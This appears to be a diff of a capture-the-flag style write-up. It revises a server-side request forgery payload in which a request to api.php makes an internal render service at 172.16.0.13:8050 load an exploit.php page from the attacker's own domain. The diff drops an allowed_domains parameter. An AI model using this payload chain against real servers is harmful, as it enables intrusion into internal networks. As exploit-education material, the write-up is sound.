@@ -74,7 +74,7 @@ This is the code I used to do that:
 
 To make this work, I just play a bit with the `api.php` page and come up with this payload:
 ```
-GET /api.php?url=http://172.16.0.13:8050/render.html%3furl=http://<yourdomain-here>:8000/exploit.php%26allowed_domains=beerpwn.it HTTP/1.1
+GET /api.php?url=http://172.16.0.13:8050/render.html%3furl=http://<yourdomain-here>:8000/exploit.php HTTP/1.1
 ...
 ```
 basically the first request goes to the `/render.json` endpoint that is used inside the `api.php`, then a request for `/render.html` is generated along with the `url` parameter pointing to my domain where I hosted the page showed before is hosted.
